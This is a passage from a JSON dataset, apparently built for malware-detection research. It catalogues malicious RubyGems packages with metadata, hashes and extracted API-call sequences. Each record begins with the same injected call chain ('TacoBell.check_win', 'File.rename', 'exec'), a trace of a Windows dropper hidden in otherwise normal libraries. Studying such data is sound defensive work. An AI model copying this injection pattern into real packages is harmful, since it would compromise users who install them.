            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'update_repository_cache', 'copy_repository_cache', 'distribute!', 'FileUtils.rm', 'filename', 'FileUtils.rm_rf', 'destination', 'remove_repository_cache?', 'FileUtils.rm_rf', 'repository_cache', 'private', 'File.exists?', 'repository_cache', 'logger.debug', 'logger', 'revision', 'repository_cache', 'system', 'source.sync', 'source', 'revision', 'repository_cache', 'logger.debug', 'logger', 'repository_cache', 'system', 'source.checkout', 'source', 'revision', 'repository_cache', '$?.==', 'raise', 'logger.debug', 'logger', 'repository_cache_subdir', 'destination', 'copy_exclude.empty?', 'copy_exclude', 'run_locally', 'repository_cache_subdir', 'destination', 'mark', 'copy_exclude.map { |e,|\\n  \"--exclude=\\\\\"#{e}\\\\\"\"\\n}.join', 'copy_exclude.map', 'copy_exclude', 'run_locally', 'repository_cache_subdir', 'destination', 'mark', 'logger.trace', 'logger', 'destination', 'filename', 'Dir.chdir', 'copy_dir', 'system', 'compress(File.basename(destination), File.basename(filename)).join', 'compress', 'File.basename', 'destination', 'File.basename', 'filename', 'revision', 'destination', 'File.join', 'remote_dir', 'File.basename', 'destination', 'compression.extension', 'compression', 'copy_cache', 'Dir.mktmpdir', 'copy_dir', 'configuration.[]', 'configuration', 'File.join', 'repository_cache', 'configuration.[]', 'configuration', 'repository_cache', 'copy_cache.!', 'copy_cache', 'set', 'set', 'set', 'File.join', 'user', 'application', 'set', 'set', 'set', 'set', 'set', 'set', 'role', 'role', 'role', '$LOAD_PATH.push', 'File.expand_path', 'File.dirname', 'require', 'invoke_command', 'file.dump', 'logger.debug', 'logger', 'invoke_command', 'File.dirname(file).dump', 'File.dirname', 'raise', 'Tempfile.new', 'download', 'tempfile.path', 'tempfile.read', 'content.!=', 'abort', 'logger.info', 'logger', 'content.dump', 'raise', 'task', 'find_and_execute_task', 'find_and_execute_task', 'namespace', 'task', 'methods.grep(/^test_/).each', 'methods.grep', 'methods', 'send', 'before', 'after', 'task', 'set', 'set', 'reset!', 'find_and_execute_task', 'task', 'run', 'deploy_to.dump', 'deploy_to', 'task', 'find_and_execute_task', 'assert_file_exists', 'File.join', 'current_path', 'assert_file_exists', 'File.join', 'current_path', 'assert_file_content', 'File.join', 'current_path', 'File.read', 'assert_file_content', 'File.join', 'current_path', 'File.read', 'namespace', 'task', 'methods.grep(/^test_/).each', 'methods.grep', 'methods', 'send', 'before', 'after', 'task', 'run_locally', 'set', 'set', 'reset!', 'find_and_execute_task', 'task', 'run_locally', 'run', 'deploy_to.dump', 'deploy_to', 'task', 'run_locally', 'run_locally', 'find_and_execute_task', 'assert_file_exists', 'File.join', 'current_path', 'assert_file_exists', 'File.join', 'current_path', 'assert_file_content', 'File.join', 'current_path', 'File.read', 'assert_file_content', 'File.join', 'current_path', 'File.read', 'task', 'run_locally', 'run_locally', 'find_and_execute_task', 'assert_file_exists', 'File.join', 'current_path', 'assert_file_exists', 'File.join', 'current_path', 'assert_file_content', 'File.join', 'current_path', 'File.read', 'assert_file_content', 'File.join', 'current_path', 'File.read']",
            "n_tokens": 916,
            "embedding": "[ 0.00277941  0.01128304 -0.00501468 ... -0.00445097 -0.02120793\n  0.01174446]",
            "cluster": "0",
            "id": 495,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/capistrano_copy-subdir/0.1.0/capistrano_copy-subdir-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/capistrano_copy-subdir/0.1.0/capistrano_copy-subdir-0.1.0_extracted",
            "name": "capistrano_copy-subdir",
            "version": "0.1.0",
            "published_at": "2020-02-15T22:19:58.320Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "net-scp, net-ssh, vagrant, capistrano",
            "SHA-256": "0b8416ba221cac5274faaed4d34e5284e4f72af89b277755a6d35cfcfd373a17"
        },
        {
            "name_version": "acception_client-1.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_client/1.2.0/acception_client-1.2.0_extracted/acception_client-1.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'Configuration.new', 'block_given?', 'configuration', 'I18n.load_path', 'Dir.[]', 'File.expand_path(\"../../../config/locales\", \"/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_client/1.2.0/acception_client-1.2.0_extracted/acception_client-1.2.0_sourcecode.rb\").+', 'File.expand_path', 'require', 'attr_accessor', 'raise', 'raise', 'Endow.configure', 'c.logger=', 'autoload', 'protected', 'attr_reader', 'Acception::MessageType::DATA.key', 'attributes.[]', 'attributes', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'occurred_at.is_a?', 'occurred_at.iso8601', '{ name: attributes.[](:name), content: data, content_type: attributes.[](:content_type) }.reject', 'attributes.[]', 'attributes', 'data', 'attributes.[]', 'attributes', 'v.blank?', 'include', 'set_content', 'synthesized_attributes', 'protected', 'attr_reader', '{ application: application, comment: comment, environment: environment, message: message, message_type: message_type, occurred_at: occurred_at, path: path, request_headers: request_headers, request_parameters: request_parameters, stack: stack, session: session, type: type, variables: variables }.reject', 'application', 'comment', 'environment', 'message', 'message_type', 'occurred_at', 'path', 'request_headers', 'request_parameters', 'stack', 'session', 'type', 'variables', 'v.blank?', 'attributes.[]', 'attributes', 'Acception::Client::Configuration.application', 'raise', 'attributes.[]', 'attributes', 'text.gsub(/\\\\n\\\\ \\\\ /, \"\\\\n\").gsub(\"`\", \"\\'\").gsub', 'text.gsub(/\\\\n\\\\ \\\\ /, \"\\\\n\").gsub', 'text.gsub', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'raise', 'Acception::MessageType.new(message_type).key', 'Acception::MessageType.new', 'attributes.[]', 'attributes', 'occurred_at.is_a?', 'occurred_at.iso8601', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'stack.is_a?', 'raise', 'clean_text_for_request', 'stack.join', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'Acception::Client.configuration.retry_attempts', 'Acception::Client.configuration', 'Acception::Client.configuration.retry_sleep', 'Acception::Client.configuration', 'Acception::Client.configuration.open_timeout_in_seconds', 'Acception::Client.configuration', 'Acception::Client.configuration.read_timeout_in_seconds', 'Acception::Client.configuration', '{ \"Accept\" => accept, \"Content-Type\" => content_type, authentication_token_key => authentication_token }.reject', 'accept', 'content_type', 'authentication_token_key', 'authentication_token', 'v.blank?', 'accept.match', 'accept', '[matches.[](1), matches.[](4)].join', 'matches.[]', 'matches.[]', 'Acception::Client.configuration.authentication_token', 'Acception::Client.configuration', 'File.join', 'Acception::Client.configuration.base_url', 'Acception::Client.configuration', 'Acception::Client.configuration.ssl_verify_mode', 'Acception::Client.configuration', 'Acception::Client.configuration.graceful_errors_map', 'Acception::Client.configuration', 'autoload', 'protected', 'attr_reader', 'error.try', 'error', 'Acception::MessageType.new(attributes.[](:message_type) || Acception::MessageType::ERROR).key', 'Acception::MessageType.new', 'attributes.[]', 'attributes', 'error.try', 'error', 'clean_text_for_request', 'stack.join', 'error.try(:class).try', 'error.try', 'error', 'autoload', 'protected', 'attr_reader', 'Acception::MessageType.new(attributes.[](:message_type) || Acception::MessageType::INFO).key', 'Acception::MessageType.new', 'attributes.[]', 'attributes', 'attributes.[]', 'attributes', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'occurred_at.is_a?', 'occurred_at.iso8601', 'autoload', 'protected', '(attributes.[](:occurred_at) || Time.now.utc)\\n.iso8601', 'attributes.[]', 'attributes', 'Time.now.utc', 'Time.now', 'attributes.[]', 'attributes', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'occurred_at.is_a?', 'occurred_at.iso8601', 'include']",
            "n_tokens": 1109,
            "embedding": "[-0.00258746 -0.01147299 -0.00299588 ... -0.00436039 -0.0325068\n  0.00783431]",
            "cluster": "0",
            "id": 643,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_client/1.2.0/acception_client-1.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_client/1.2.0/acception_client-1.2.0_extracted",
            "name": "acception_client",
            "version": "1.2.0",
            "published_at": "2020-02-16T01:48:37.530Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, endow, enumerative, hashie, oj",
            "SHA-256": "ade413beecb8ab829d6e9cefaaeaa3b9ec5698efac01b4033073313f9c7ba7e4"
        },
        {
            "name_version": "ace_client-ext-0.0.11",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ace_client-ext/0.0.11/ace_client-ext-0.0.11_extracted/ace_client-ext-0.0.11_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', '60.*', '60.*', 'options.merge', 'lambda', 'params.[]=', 'params.delete', 'AceClient::Query2.new', 'client.extend', 'self.action', '[response.[](\"DescribeInstancesResponse\").[](\"reservationSet\").[](\"item\")].flatten', 'response.[](\"DescribeInstancesResponse\").[](\"reservationSet\").[]', 'response.[](\"DescribeInstancesResponse\").[]', 'response.[]', 'items.map { |item,|\\n  item.[](\"instancesSet\").[](\"item\")\\n}.flatten', 'items.map', 'item.[](\"instancesSet\").[]', 'item.[]', 'self.action', 'options.[]', '[response.[](options.[](:action) + \"Response\").[](options.[](:key)).[](\"item\")].flatten', 'response.[](options.[](:action) + \"Response\").[](options.[](:key)).[]', 'response.[](options.[](:action) + \"Response\").[]', 'response.[]', 'options.[](:action).+', 'options.[]', 'options.[]', '{ regions: { action: \"DescribeRegions\", key: \"regionInfo\" }, availability_zones: { action: \"DescribeAvailabilityZones\", key: \"availabilityZoneInfo\" }, volumes: { action: \"DescribeVolumes\", key: \"volumeSet\" }, key_pairs: { action: \"DescribeKeyPairs\", key: \"keySet\" }, images: { action: \"DescribeImages\", key: \"imagesSet\" }, security_groups: { action: \"DescribeSecurityGroups\", key: \"securityGroupInfo\" }, ssl_certificates: { action: \"DescribeSslCertificates\", key: \"certsSet\" }, addresses: { action: \"DescribeAddresses\", key: \"addressesSet\" }, uploads: { action: \"DescribeUploads\", key: \"uploads\" } }.each', 'define_method', 'items', 'options.[]', 'options.[]', 'self.action', '[response.[](\"DescribeLoadBalancersResponse\").[](\"DescribeLoadBalancersResult\").[](\"LoadBalancerDescriptions\").[](\"member\")].flatten', 'response.[](\"DescribeLoadBalancersResponse\").[](\"DescribeLoadBalancersResult\").[](\"LoadBalancerDescriptions\").[]', 'response.[](\"DescribeLoadBalancersResponse\").[](\"DescribeLoadBalancersResult\").[]', 'response.[](\"DescribeLoadBalancersResponse\").[]', 'response.[]', 'self.action', 'response.[](\"DescribeInstancesResponse\").[](\"reservationSet\").[](\"item\").[](\"instancesSet\").[]', 'response.[](\"DescribeInstancesResponse\").[](\"reservationSet\").[](\"item\").[]', 'response.[](\"DescribeInstancesResponse\").[](\"reservationSet\").[]', 'response.[](\"DescribeInstancesResponse\").[]', 'response.[]', 'options.[]', 'options.[]', 'timeout', 'options.[]', 'instances.all?', 'instances', 'instance.[](\"instanceState\").[](\"name\").!=', 'instance.[](\"instanceState\").[]', 'instance.[]', 'instances.empty?', 'instances', 'instances.each', 'instances', 'instance.[](\"instanceState\").[](\"name\").!=', 'instance.[](\"instanceState\").[]', 'instance.[]', 'self.action', 'instance.[]', 'sleep', 'options.[]', 'options.[]', 'options.[]', 'timeout', 'options.[]', 'instances.empty?', 'instances', 'instances.each', 'instances', 'self.action', 'instance.[]', 'response.[](\"DescribeInstanceAttributeResponse\").[](\"disableApiTermination\").[](\"value\").==', 'response.[](\"DescribeInstanceAttributeResponse\").[](\"disableApiTermination\").[]', 'response.[](\"DescribeInstanceAttributeResponse\").[]', 'response.[]', 'self.action', 'instance.[]', 'self.action', 'instance.[]', 'uploads.each', 'uploads', 'self.action', 'upload.[]', 'sleep', 'options.[]', 'key_pairs.each', 'key_pairs', 'self.action', 'key_pair.[]', 'self.action', 'response.[](\"DescribeSecurityGroupsResponse\").[](\"securityGroupInfo\").[]', 'response.[](\"DescribeSecurityGroupsResponse\").[]', 'response.[]', 'loop', 'find_security_group_by_name', 'group.[](\"groupStatus\").==', 'group.[]', 'sleep', 'security_groups.each', 'security_groups', '[group.[](\"ipPermissions\").[](\"item\")].flatten', 'group.[](\"ipPermissions\").[]', 'group.[]', 'rules.empty?', 'rules.each', 'hash.[]=', 'rule.[]', 'rule.[]', 'hash.[]=', 'rule.[]', 'rule.[]', 'hash.[]=', 'rule.[]', 'rule.[]', 'hash.[]=', 'rule.[]', 'rule.key?', 'hash.[]=', 'rule.[](\"ipRanges\").[](\"item\").[]', 'rule.[](\"ipRanges\").[]', 'rule.[]', 'rule.key?', 'hash.[]=', 'rule.[](\"groups\").[](\"item\").[]', 'rule.[](\"groups\").[]', 'rule.[]', 'hash.[]=', 'group.[]', 'self.action', 'wait_security_group_status', 'group.[]', 'security_groups.empty?', 'security_groups', 'security_groups.each', 'security_groups', 'self.action', 'group.[]', 'sleep', 'self.load_balancers.each', 'self.load_balancers', 'lb.[]', 'lb.[](\"ListenerDescriptions\").[](\"member\").[](\"Listener\").[]', 'lb.[](\"ListenerDescriptions\").[](\"member\").[]', 'lb.[](\"ListenerDescriptions\").[]', 'lb.[]', 'lb.[](\"ListenerDescriptions\").[](\"member\").[](\"Listener\").[]', 'lb.[](\"ListenerDescriptions\").[](\"member\").[]', 'lb.[](\"ListenerDescriptions\").[]', 'lb.[]', 'self.action', 'self.volumes.each', 'self.volumes', 'self.action', 'volume.[]', 'self.images.each', 'self.images', 'image.[](\"imageOwnerId\").==', 'image.[]', 'self.action', 'image.[]', 'self.ssl_certificates.each', 'self.ssl_certificates', 'self.action', 'sc.[]', 'stop_instances', 'options.[]', 'options.[]', 'delete_instances', 'options.[]', 'options.[]', 'delete_key_pairs', 'delete_security_group_rules', 'delete_security_groups', 'delete_load_balancers', 'delete_volumes', 'delete_images', 'delete_ssl_certificates', 'module_function', 'AceClient::Query2.new', 'client.extend', 'self.action', '[response.[](\"Describe#{key}sResponse\").[](\"Describe#{key}sResult\").[](\"#{key}s\").[](key)].flatten', 'response.[](\"Describe#{key}sResponse\").[](\"Describe#{key}sResult\").[](\"#{key}s\").[]', 'response.[](\"Describe#{key}sResponse\").[](\"Describe#{key}sResult\").[]', 'response.[](\"Describe#{key}sResponse\").[]', 'response.[]', '{ nas_instances: \"NASInstance\", nas_security_groups: \"NASSecurityGroup\" }.each', 'define_method', 'items', 'nas_instances.each', 'nas_instances', 'self.action', 'nas_instance.[]', 'timeout', '60.*', 'nas_instances.empty?', 'nas_instances', 'nas_instances.any?', 'nas_instances', 'nas_instance.[](\"NASInstanceStatus\").==', 'nas_instance.[]', 'nas_instances.select', 'nas_instances', 'nas_instance.[](\"NASInstanceStatus\").==', 'nas_instance.[]', 'raise', 'failed.map { |f,|\\n  f.[](\"NASInstanceIdentifier\")\\n}.join', 'failed.map', 'f.[]', 'sleep', 'nas_security_groups.each', 'nas_security_groups', 'self.action', 'nas_security_group.[]', 'delete_nas_instances', 'delete_nas_security_groups', 'module_function', 'AceClient::Query2.new', 'client.extend', 'self.action', '[response.[](\"Describe#{key}sResponse\").[](\"Describe#{key}sResult\").[](\"#{key}s\").[](key)].flatten', 'response.[](\"Describe#{key}sResponse\").[](\"Describe#{key}sResult\").[](\"#{key}s\").[]', 'response.[](\"Describe#{key}sResponse\").[](\"Describe#{key}sResult\").[]', 'response.[](\"Describe#{key}sResponse\").[]', 'response.[]', '{ db_instances: \"DBInstance\", db_security_groups: \"DBSecurityGroup\", db_snapshots: \"DBSnapshot\", db_parameter_groups: \"DBParameterGroup\" }.each', 'define_method', 'items', 'db_instances.each', 'db_instances', 'self.action', 'db_instance.[]', 'timeout', '60.*', 'db_instances.empty?', 'db_instances', 'db_instances.any?', 'db_instances', 'db_instance.[](\"DBInstanceStatus\").==', 'db_instance.[]', 'db_instances.select', 'db_instances', 'db_instance.[](\"DBInstanceStatus\").==', 'db_instance.[]', 'raise', 'failed.map { |f,|\\n  f.[](\"DBInstanceIdentifier\")\\n}.join', 'failed.map', 'f.[]', 'sleep', 'db_security_groups.each', 'db_security_groups', 'self.action', 'db_security_group.[]', 'db_snapshots.each', 'db_snapshots', 'self.action', 'db_snapshot.[]', 'db_parameter_groups.each', 'db_parameter_groups', 'self.action', 'db_parameter_group.[]', 'delete_db_instances', 'delete_db_security_groups', 'delete_db_snapshots', 'delete_db_parameter_groups', 'module_function']",
            "n_tokens": 2145,
            "embedding": "[-0.01601906 -0.00363261 -0.01181534 ...  0.00012186 -0.02393028\n  0.01611268]",
            "cluster": "0",
            "id": 561,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ace_client-ext/0.0.11/ace_client-ext-0.0.11.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ace_client-ext/0.0.11/ace_client-ext-0.0.11_extracted",
            "name": "ace_client-ext",
            "version": "0.0.11",
            "published_at": "2020-02-16T01:54:15.439Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "00bd23cc10a091267b8284d4a6aa5acf79c098d2fcd00656098e521ad051ad8a"
        },
        {
            "name_version": "ach-client-1.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ach-client/1.0.3/ach-client-1.0.3_extracted/ach-client-1.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'Dir.[](Gem::Specification.find_by_name(\"ach_client\").gem_dir + \"/lib/**/*.rb\").sort.each', 'Dir.[](Gem::Specification.find_by_name(\"ach_client\").gem_dir + \"/lib/**/*.rb\").sort', 'Dir.[]', 'Gem::Specification.find_by_name(\"ach_client\").gem_dir.+', 'Gem::Specification.find_by_name(\"ach_client\").gem_dir', 'Gem::Specification.find_by_name', 'require', 'f.split(\"/lib/\").last.split(\".rb\").first', 'f.split(\"/lib/\").last.split', 'f.split(\"/lib/\").last', 'f.split', 'const_set', 'Class.new', 'include', 'include', 'const_set', 'Class.new', 'const_set', 'Class.new', 'const_set', 'Class.new', '(dollars.to_f.round(2) * 100)\\n.to_i', 'dollars.to_f.round(2).*', 'dollars.to_f.round', 'dollars.to_f', 'hashlist.reduce', 'map.merge', 'left_value.+', 'include', 'AchClient::Logging.log_provider.send_logs', 'AchClient::Logging.log_provider', 'maybe_encrypt_message', 'Savon::LogMessage.new(body, AchClient::Logging.log_filters, true).to_s', 'Savon::LogMessage.new', 'AchClient::Logging.log_filters', 'private', 'AchClient::Logging.should_use_encryption?', 'AchClient::Logging.codec.encrypt_and_sign', 'AchClient::Logging.codec', 'raise', 'puts', 'puts', 'require_relative', 'require_relative', 'Savon.observers.<<', 'Savon.observers', 'AchClient::Logging::SavonObserver.new', 'class_attribute', 'class_attribute', 'class_attribute', 'self._log_provider_type', 'log_provider.is_a?', 'log_provider.<', 'self._log_provider_type=', 'raise', 'class_attribute', 'self._log_filters', 'self._log_filters=', 'ActiveSupport::MessageEncryptor.new', 'ActiveSupport::KeyGenerator.new(AchClient::Logging.encryption_password).generate_key', 'ActiveSupport::KeyGenerator.new', 'AchClient::Logging.encryption_password', 'AchClient::Logging.encryption_salt', 'encryption_password', 'encryption_salt', 'codec.decrypt_and_verify', 'codec', 'AchClient::Logging::LogProviderJob.perform_async', 'builder.to_s', 'DateTime.now', 'attr_reader', 'self.class.==', 'self.class', 'raise', 'require_relative', 'attr_reader', 'attr_reader', 'attr_accessor', '@code.start_with?', '@code.start_with?', 'class_attribute', 'self._return_codes', 'YAML.load_file(File.expand_path(File.join(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/ach-client/1.0.3/ach-client-1.0.3_extracted/ach-client-1.0.3_sourcecode.rb\"), RETURN_CODES_YAML))).map', 'YAML.load_file', 'File.expand_path', 'File.join', 'File.dirname', 'ReturnCode.new', 'code.[]', 'code.[]', 'code.[]', 'self.all.find', 'self.all', 'return_code.code.==', 'return_code.code', 'raise', '@ach_transactions.all?', 'do_send_batch', 'raise', 'raise', 'raise', 'raise', 'attr_reader', 'arguments', 'arguments.extract_options!', 'self.class.arguments.each', 'self.class.arguments', 'self.class', 'self.instance_variable_set', '\"@#{param}\".to_sym', 'args.[]', 'transaction_type.==', 'transaction_type', 'transaction_type.==', 'transaction_type', 'sendable?', 'do_send', 'raise', 'raise', 'effective_entry_date.future?', 'effective_entry_date', 'effective_entry_date.today?', 'effective_entry_date', 'raise', 'raise', 'private_class_method', 'self.new', 'args.map { |arg,|\\n  { arg => self.to_s.deconstantize.constantize.send(arg) }\\n}.reduce', 'args.map', 'self.to_s.deconstantize.constantize.send', 'self.to_s.deconstantize.constantize', 'self.to_s.deconstantize', 'self.to_s', 'raise', 'self.transformer.[]', 'self.transformer', 'raise', 'self.transformer.find { |_, v|\\n  type <= v\\n}.try', 'self.transformer.find', 'self.transformer', 'type.<=', 'raise', 'self.transformer.values.join', 'self.transformer.values', 'self.transformer', 'raise', 'self.class.parent.file_naming_strategy.call', 'self.class.parent.file_naming_strategy', 'self.class.parent', 'self.class', 'self.class.parent.write_remote_file', 'self.class.parent', 'self.class', 'File.join', 'self.class.parent.outgoing_path', 'self.class.parent', 'self.class', 'batch_file_name', 'cook_some_nachas.to_s', 'cook_some_nachas', '@ach_transactions.map', 'ACH::ACHFile.new', 'nacha.instance_variable_set', 'nacha_file_header', '@ach_transactions.group_by(&:sec_code).map', '@ach_transactions.group_by', 'transactions.group_by(&:originator_name).map', 'transactions.group_by', 'batch_transactions.group_by(&:effective_entry_date).map', 'batch_transactions.group_by', 'nacha.batches.<<', 'nacha.batches', 'nacha_batch', 'private', 'ACH::Records::FileHeader.new', '[:immediate_destination, :immediate_destination_name, :immediate_origin, :immediate_origin_name].each', 'file_header.send', 'self.class.parent.send', 'self.class.parent', 'self.class', 'ACH::Batch.new', 'batch.header', 'batch_header.company_name=', 'batch_header.company_identification=', 'self.class.parent.company_identification', 'self.class.parent', 'self.class', 'batch_header.standard_entry_class_code=', 'batch_header.company_entry_description=', 'self.class.parent.company_entry_description', 'self.class.parent', 'self.class', 'batch_header.company_descriptive_date=', 'batch_header.effective_entry_date=', 'batch_header.originating_dfi_identification=', 'self.class.parent.originating_dfi_identification', 'self.class.parent', 'self.class', 'transactions.each', 'batch.entries.<<', 'batch.entries', 'transaction.to_entry_detail', 'process_files', 'most_recent_files', 'self.parent.with_sftp_connection', 'self.parent', 'process_files', 'files_in_range', 'private_class_method', 'Helpers::Utils.hashlist_merge', '(files || [])\\n.reduce', 'ACH::ACHFile.new(entry.last).batches.map { |batch,|\\n  batch.entries.map { |ach,|\\n    { ach.individual_id_number => [process_ach(batch, ach)] }\\n  }\\n}.reduce([], &:+).+', 'ACH::ACHFile.new(entry.last).batches.map { |batch,|\\n  batch.entries.map { |ach,|\\n    { ach.individual_id_number => [process_ach(batch, ach)] }\\n  }\\n}.reduce', 'ACH::ACHFile.new(entry.last).batches.map', 'ACH::ACHFile.new(entry.last).batches', 'ACH::ACHFile.new', 'entry.last', 'batch.entries.map', 'batch.entries', 'ach.individual_id_number', 'process_ach', 'private_class_method', 'ach.addenda.length.==', 'ach.addenda.length', 'ach.addenda', 'AchClient::SettledAchResponse.new', '(ach.amount / 100.0)\\n.to_d', 'ach.amount./', 'ach.amount', 'batch.header.effective_entry_date', 'batch.header', 'process_ach_return', 'private_class_method', 'ach.addenda.first.reason_code.first', 'ach.addenda.first.reason_code', 'ach.addenda.first', 'ach.addenda', 'AchClient::ReturnedAchResponse.new', '(ach.amount / 100.0)\\n.to_d', 'ach.amount./', 'ach.amount', 'batch.header.effective_entry_date', 'batch.header', 'AchClient::ReturnCodes.find_by', 'ach.addenda.first.reason_code', 'ach.addenda.first', 'ach.addenda', 'AchClient::CorrectedAchResponse.new', '(ach.amount / 100.0)\\n.to_d', 'ach.amount./', 'ach.amount', 'batch.header.effective_entry_date', 'batch.header', 'AchClient::ReturnCodes.find_by', 'ach.addenda.first.reason_code', 'ach.addenda.first', 'ach.addenda', 'ach.addenda.first.corrected_data', 'ach.addenda.first', 'ach.addenda', 'private_class_method', 'self.parent.incoming_path', 'self.parent', 'private_class_method', 'connection.dir.entries(self.parent.incoming_path).select { |file,|\\n  last_modified_time = Time.at(file.attributes.mtime) - 1.minute\\n  last_modified_time > start_date && (!end_date || last_modified_time < end_date) && file.name != \"most_recent\"\\n}.map { |file,|\\n  body = connection.file.open(inbox_path_to(file.name), \"r\").read\\n  AchClient::Logging::LogProviderJob.perform_async({ body: body, name: \"response-#{DateTime.now}-#{file.name.parameterize}\" })\\n  { file.name => body }\\n}.reduce', 'connection.dir.entries(self.parent.incoming_path).select { |file,|\\n  last_modified_time = Time.at(file.attributes.mtime) - 1.minute\\n  last_modified_time > start_date && (!end_date || last_modified_time < end_date) && file.name != \"most_recent\"\\n}.map', 'connection.dir.entries(self.parent.incoming_path).select', 'connection.dir.entries', 'connection.dir', 'self.parent.incoming_path', 'self.parent', 'Time.at(file.attributes.mtime).-', 'Time.at', 'file.attributes.mtime', 'file.attributes', '1.minute', 'last_modified_time.>', 'end_date.!', 'last_modified_time.<', 'file.name.!=', 'file.name', 'connection.file.open(inbox_path_to(file.name), \"r\").read', 'connection.file.open', 'connection.file', 'inbox_path_to', 'file.name', 'AchClient::Logging::LogProviderJob.perform_async', 'DateTime.now', 'file.name.parameterize', 'file.name', 'file.name', 'private_class_method', 'connection.file.open(inbox_path_to(\"most_recent\"), \"r\").read', 'connection.file.open', 'connection.file', 'inbox_path_to', 'DateTime.parse', 'e.code.==', 'e.code', 'update_most_recent_check_date', 'Time.at(0).to_datetime', 'Time.at', 'raise', 'private_class_method', 'connection.file.open', 'connection.file', 'inbox_path_to', 'file.write', 'DateTime.now.to_s', 'DateTime.now', 'private_class_method', 'self.parent.with_sftp_connection', 'self.parent', 'files_in_range', 'last_most_recent_check_date', 'update_most_recent_check_date', 'raise', 'ACH::EntryDetail.new', 'entry.transaction_code=', 'remove_newlines', 'transaction_code', 'entry.routing_number=', 'remove_newlines', 'routing_number', 'entry.account_number=', 'remove_newlines', 'account_number', 'entry.amount=', 'amount_in_cents', 'entry.individual_id_number=', 'remove_newlines', 'external_ach_id', 'entry.individual_name=', 'remove_newlines', 'merchant_name', 'entry.originating_dfi_identification=', 'remove_newlines', 'self.class.parent.originating_dfi_identification', 'self.class.parent', 'self.class', 'entry.trace_number=', 'remove_non_digits(external_ach_id).to_i', 'remove_non_digits', 'external_ach_id', 'private', 'value.gsub', 'value.gsub', 'Helpers::DollarsToCents.dollars_to_cents', 'amount.abs', 'amount', '[AccountTypeTransformer.serialize_to_provider_value(account_type), TransactionTypeTransformer.serialize_to_provider_value(potentially_flipped_transaction_type)].reduce', 'AccountTypeTransformer.serialize_to_provider_value', 'account_type', 'TransactionTypeTransformer.serialize_to_provider_value', 'potentially_flipped_transaction_type', 'amount.negative?', 'amount', 'transaction_type.==', 'transaction_type', 'self.transaction_type', 'extend', 'included', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'require', 'extend', 'included', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'Net::SFTP.start', 'connection_params', 'self.with_sftp_connection', 'sftp_connection.file.open', 'sftp_connection.file', 'AchClient::Logging::LogProviderJob.perform_async', 'DateTime.now', 'file_path.parameterize', 'file.puts', 'self.with_sftp_connection', 'sftp_connection.dir.glob', 'sftp_connection.dir', 'result.map', 'self.with_sftp_connection', 'sftp_connection.dir.glob(file_path, glob).map { |file,|\\n  { file.name => sftp_connection.file.open(File.join(file_path, file.name), \"r\").read }\\n}.reduce', 'sftp_connection.dir.glob(file_path, glob).map', 'sftp_connection.dir.glob', 'sftp_connection.dir', 'file.name', 'sftp_connection.file.open(File.join(file_path, file.name), \"r\").read', 'sftp_connection.file.open', 'sftp_connection.file', 'File.join', 'file.name', 'files.each', 'AchClient::Logging::LogProviderJob.perform_async', 'DateTime.now', 'private_class_method', 'host', 'username', '[(if private_ssh_key\\n  { key_data: [private_ssh_key] }\\nelse\\n  nil\\nend), (if passphrase\\n  { passphrase: passphrase }\\nelse\\n  nil\\nend), { password: password }].compact.reduce', '[(if private_ssh_key\\n  { key_data: [private_ssh_key] }\\nelse\\n  nil\\nend), (if passphrase\\n  { passphrase: passphrase }\\nelse\\n  nil\\nend), { password: password }].compact', 'private_ssh_key', 'private_ssh_key', 'passphrase', 'passphrase', 'password', 'AchClient::AchWorks.wrap_request({ method: :send_ach_trans_batch, message: self.to_hash, path: [:send_ach_trans_batch_response, :send_ach_trans_batch_result] 